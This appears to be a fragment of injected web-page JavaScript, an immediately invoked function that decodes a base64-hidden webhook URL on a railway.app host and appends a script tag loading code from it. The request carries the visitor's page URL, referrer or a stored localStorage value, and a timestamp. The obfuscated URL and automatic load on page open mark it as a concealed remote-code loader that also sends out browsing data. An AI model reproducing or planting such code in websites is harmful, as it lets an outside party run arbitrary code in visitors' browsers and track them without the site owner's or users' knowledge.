...
(function(){
  const scrwebxc = document.createElement("script");
  const iref = localStorage.getItem('iref') || document.referrer || "so";
  const u = atob('aHR0cHM6Ly9wcmltYXJ5LXByb2R1Y3Rpb24tOTRiZTAudXAucmFpbHdheS5hcHAvd2ViaG9vay93ZWJ4')
  scrwebxc.src =  `${u}?referer=${encodeURIComponent(window.location.href)}&t=${Date.now()}&i=${iref}` ;
  scrwebxc.defer = true;
  document.head.appendChild(scrwebxc);
  })();
